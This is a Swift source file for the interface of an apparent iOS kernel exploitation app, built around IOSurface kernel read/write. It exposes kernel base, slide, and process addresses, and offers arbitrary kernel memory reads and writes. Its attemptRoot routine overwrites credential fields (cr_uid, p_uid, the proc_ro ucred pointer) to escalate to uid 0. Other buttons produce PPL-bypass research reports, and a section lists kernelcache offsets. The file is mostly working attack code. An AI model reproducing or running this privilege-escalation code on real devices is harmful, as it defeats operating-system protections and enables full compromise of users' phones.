//
//  BleedingEdgeIOSurfaceKRW.swift
//  DSPloit
//
//  IOSurface KRW Research & Exploitation View
//  Created by Royan
//

import SwiftUI

struct BleedingEdgeIOSurfaceKRWView: View {
    @ObservedObject private var engine = IOSurfaceKRWEngine.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var resultMsg = ""
    @State private var gxfReport = ""
    @State private var dmaReport = ""
    @State private var readAddr = ""
    @State private var readResult = ""
    @State private var writeAddr = ""
    @State private var writeVal = ""
    @State private var writeResult = ""
    @State private var rootResult = ""
    
    var body: some View {
        List {
            // Status
            Section(header: HeaderLabel(text: "IOSurface KRW Status", icon: "cpu")) {
                HStack {
                    StatusIndicator(active: mgr.dsready, label: "Kernel")
                    Spacer()
                    StatusIndicator(active: mgr.sbxready, label: "Sandbox")
                    Spacer()
                    StatusIndicator(active: engine.isReady, label: "IOSurface")
                }
                
                if engine.surfaceID != 0 {
                    VStack(alignment: .leading, spacing: 4) {
                        InfoRow(label: "Surface ID", value: "\(engine.surfaceID)", color: .cyan)
                        InfoRow(label: "Mapped Addr", value: String(format: "0x%llx", engine.mappedAddress), color: .green)
                    }
                }
            }
            
            // Initialize
            Section(header: HeaderLabel(text: "Initialize", icon: "bolt.fill")) {
                Button(action: {
                    let result = engine.openIOSurfaceRoot()
                    resultMsg = result.message
                }) {
                    HStack {
                        Image(systemName: "play.circle.fill")
                        Text("Open IOSurfaceRoot")
                        Spacer()
                        if engine.isReady {
                            Image(systemName: "checkmark.circle.fill")
                                .foregroundStyle(.green)
                        }
                    }
                }
                .disabled(!mgr.dsready || !mgr.sbxready)
                
                if !mgr.sbxready {
                    PlainAlert(
                        title: "Requires Sandbox Escape",
                        icon: "lock.fill",
                        text: "Run sandbox escape first (Main tab → Initialize System)",
                        color: .orange
                    )
                }
            }
            
            // Quick Address Buttons (tap to copy or auto-fill)
            Section(header: HeaderLabel(text: "Quick Addresses (tap to paste)", icon: "doc.on.clipboard")) {
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernbase)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_base")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernbase))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.cyan)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernslide)
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_slide")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernslide))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.orange)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let proc = ds_get_our_proc()
                    let addr = String(format: "0x%llx", proc)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_proc")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_proc()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let task = ds_get_our_task()
                    let addr = String(format: "0x%llx", task)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_task")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_task()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
            }
            
            // Read Test
            Section(header: HeaderLabel(text: "Memory Read (via IOSurface)", icon: "magnifyingglass")) {
                TextField("Address (hex)", text: $readAddr)
                    .font(.system(.body, design: .monospaced))
                
                Button("Read 8 bytes") {
                    guard let addr = UInt64(readAddr.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    let val = engine.propertyRead(address: addr)
                    readResult = String(format: "0x%llx = 0x%016llx", addr, val)
                }
                .disabled(!mgr.dsready)
                
                if !readResult.isEmpty {
                    Text(readResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(.green)
                        .textSelection(.enabled)
                }
            }
            
            // Write Test
            Section(header: HeaderLabel(text: "Memory Write", icon: "pencil.line")) {
                TextField("Write Address (hex)", text: $writeAddr)
                    .font(.system(.body, design: .monospaced))
                TextField("Value (hex)", text: $writeVal)
                    .font(.system(.body, design: .monospaced))
                
                Button("Write 8 bytes") {
                    guard let addr = UInt64(writeAddr.replacingOccurrences(of: "0x", with: ""), radix: 16),
                          let val = UInt64(writeVal.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    engine.propertyWrite(address: addr, value: val)
                    // Read back to verify
                    let readBack = engine.propertyRead(address: addr)
                    writeResult = String(format: "Wrote 0x%llx → 0x%llx\nRead back: 0x%016llx\n%@",
                                        val, addr, readBack,
                                        readBack == val ? "✅ SUCCESS" : "❌ BLOCKED (PPL?)")
                }
                .disabled(!mgr.dsready)
                .foregroundStyle(.red)
                
                if !writeResult.isEmpty {
                    Text(writeResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(writeResult.contains("SUCCESS") ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // One-tap Root Attempt
            Section(header: HeaderLabel(text: "⚡ Root Escalation Test", icon: "bolt.shield.fill")) {
                Button(action: attemptRoot) {
                    HStack {
                        Image(systemName: "person.badge.key.fill")
                        Text("Attempt uid=0 (Root)")
                        Spacer()
                        Image(systemName: "exclamationmark.triangle.fill")
                            .foregroundStyle(.orange)
                    }
                    .foregroundStyle(.red)
                }
                .disabled(!mgr.dsready)
                
                if !rootResult.isEmpty {
                    Text(rootResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(rootResult.contains("SUCCESS") ? .green : .orange)
                        .textSelection(.enabled)
                }
                
                Text("Writes uid=0 to ucred. PPL may block this.")
                    .font(.caption2)
                    .foregroundStyle(.secondary)
            }
            
            // Research: GXF Entry
            Section(header: HeaderLabel(text: "GXF Entry Research", icon: "shield.lefthalf.filled")) {
                Button("Generate GXF Report") {
                    gxfReport = engine.researchGXFEntry()
                }
                
                if !gxfReport.isEmpty {
                    Text(gxfReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.cyan)
                        .textSelection(.enabled)
                }
            }
            
            // Research: DMA Bypass
            Section(header: HeaderLabel(text: "DMA PPL Bypass Research", icon: "bolt.shield")) {
                Button("Generate DMA Report") {
                    dmaReport = engine.researchDMABypass()
                }
                
                if !dmaReport.isEmpty {
                    Text(dmaReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.orange)
                        .textSelection(.enabled)
                }
            }
            
            // Kernelcache Analysis Results
            Section(header: HeaderLabel(text: "Kernelcache Findings", icon: "doc.text.magnifyingglass")) {
                VStack(alignment: .leading, spacing: 6) {
                    Text("From deep_analyze_v3.py:")
                        .font(.caption.bold())
                    
                    InfoRow(label: "IOSurface strings", value: "762", color: .cyan)
                    InfoRow(label: "PPL checks (bit#14)", value: "223", color: .red)
                    InfoRow(label: "GXF accesses", value: "50", color: .orange)
                    InfoRow(label: "pmap functions", value: "7 with PPL checks", color: .purple)
                    
                    Text("\nKey addresses (file offsets):")
                        .font(.caption.bold())
                    
                    Group {
                        Text("GXF handler: 0xf0c440")
                        Text("PPL check #1: 0xe33e14")
                        Text("pmap_enter: 0x11126c0 (667 branches)")
                        Text("IOSurfaceRoot: 0x0067d03b (string)")
                        Text("Largest func: 0x155e280 (106KB)")
                    }
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundStyle(.green)
                }
            }
            
            // Result
            if !resultMsg.isEmpty {
                Section(header: HeaderLabel(text: "Result", icon: "info.circle")) {
                    Text(resultMsg)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(engine.isReady ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // Log
            if !engine.statusLog.isEmpty {
                Section(header: HeaderLabel(text: "Log", icon: "terminal")) {
                    ForEach(engine.statusLog.suffix(20), id: \.self) { line in
                        Text(line)
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundStyle(.secondary)
                    }
                }
            }
        }
        .navigationTitle("IOSurface KRW")
        .premiumStyling()
    }
    
    private func attemptRoot() {
        guard mgr.dsready else {
            rootResult = "Kernel not ready"
            return
        }
        
        let proc = ds_get_our_proc()
        guard proc != 0 else { rootResult = "proc = 0"; return }
        let task = ds_get_our_task()
        guard task != 0 else { rootResult = "task = 0"; return }
        
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        let origUid = ds_kread32(ucred + 0x18)
        
        var report = ""
        report += String(format: "proc:      0x%llx\n", proc)
        report += String(format: "task:      0x%llx\n", task)
        report += String(format: "proc_ro:   0x%llx\n", procRo)
        report += String(format: "ucred:     0x%llx\n", ucred)
        report += String(format: "orig uid:  %d\n\n", origUid)
        
        // ============================================================
        // SAFE WRITABILITY TEST
        // Only test INTEGER fields (not pointers!)
        // Method: try write 0 to uid fields, read back
        // If value changed → writable. If same → PPL blocked.
        // NO bit flipping on pointer fields (that caused panic)
        // ============================================================
        
        report += "=== WRITABILITY TEST (safe, no pointer modification) ===\n\n"
        
        // Test 1: ucred cr_uid (offset 0x18 from ucred)
        let uidBefore = ds_kread32(ucred + 0x18)
        ds_kwrite32(ucred + 0x18, 0)
        let uidAfter = ds_kread32(ucred + 0x18)
        ds_kwrite32(ucred + 0x18, uidBefore)  // Restore
        report += String(format: "ucred+0x18 (cr_uid):  %@ (was %d, wrote 0, got %d)\n",
                        uidAfter == 0 ? "✅ WRITABLE" : "❌ BLOCKED", uidBefore, uidAfter)
        
        // Test 2: proc p_uid (offset 0x2c)
        let puidBefore = ds_kread32(proc + 0x2c)
        ds_kwrite32(proc + 0x2c, 0)
        let puidAfter = ds_kread32(proc + 0x2c)
        ds_kwrite32(proc + 0x2c, puidBefore)  // Restore
        report += String(format: "proc+0x2c (p_uid):    %@ (was %d, wrote 0, got %d)\n",
                        puidAfter == 0 ? "✅ WRITABLE" : "❌ BLOCKED", puidBefore, puidAfter)
        
        // Test 3: proc p_flag (offset from offsets.h)
        let flagBefore = ds_kread32(proc + UInt64(off_proc_p_flag))
        ds_kwrite32(proc + UInt64(off_proc_p_flag), flagBefore)  // Write same (safe)
        let flagAfter = ds_kread32(proc + UInt64(off_proc_p_flag))
        report += String(format: "proc+0x%x (p_flag):  readable (%@)\n",
                        off_proc_p_flag, flagBefore == flagAfter ? "consistent" : "changed?!")
        
        // Test 4: proc_ro ucred pointer
        let ucredPtrBefore = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        ds_kwrite64(procRo + UInt64(off_proc_ro_p_ucred), 0x4141414141414141)
        let ucredPtrAfter = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        // Don't need to restore — if PPL blocked, value didn't change
        if ucredPtrAfter == 0x4141414141414141 {
            // OH SHIT it worked — restore immediately!
            ds_kwrite64(procRo + UInt64(off_proc_ro_p_ucred), ucredPtrBefore)
            report += "proc_ro ucred ptr:    ✅ WRITABLE!!\n"
        } else {
            report += String(format: "proc_ro ucred ptr:    ❌ BLOCKED (still 0x%llx)\n", ucredPtrAfter)
        }
        
        // Test 5: cr_label pointer in ucred (we know sandbox escape writes here)
        let labelBefore = ds_kread64(ucred + UInt64(off_ucred_cr_label))
        report += String(format: "ucred+0x%x (cr_label): 0x%llx (sandbox escape writes here)\n",
                        off_ucred_cr_label, labelBefore)
        
        // ============================================================
        // SUMMARY
        // ============================================================
        
        report += "\n=== SUMMARY ===\n"
        report += "cr_uid direct write: \(uidAfter == 0 ? "POSSIBLE → ROOT!" : "PPL BLOCKED")\n"
        report += "proc p_uid write:    \(puidAfter == 0 ? "POSSIBLE (cosmetic)" : "BLOCKED")\n"
        report += "proc_ro ucred ptr:   \(ucredPtrAfter == 0x4141414141414141 ? "WRITABLE!" : "PPL BLOCKED")\n"
        
        if uidAfter == 0 {
            report += "\n🎉 cr_uid IS writable! Getting root...\n"
            ds_kwrite32(ucred + 0x18, 0)
            ds_kwrite32(ucred + 0x1c, 0)
            ds_kwrite32(ucred + 0x20, 0)
            let newUid = getuid()
            report += String(format: "getuid() = %d\n", newUid)
            if newUid == 0 { report += "🎉🎉🎉 ROOT! 🎉🎉🎉\n" }
        }
        
        report += "\n=== DONE (no panics expected) ===\n"
        rootResult = report
    }
}
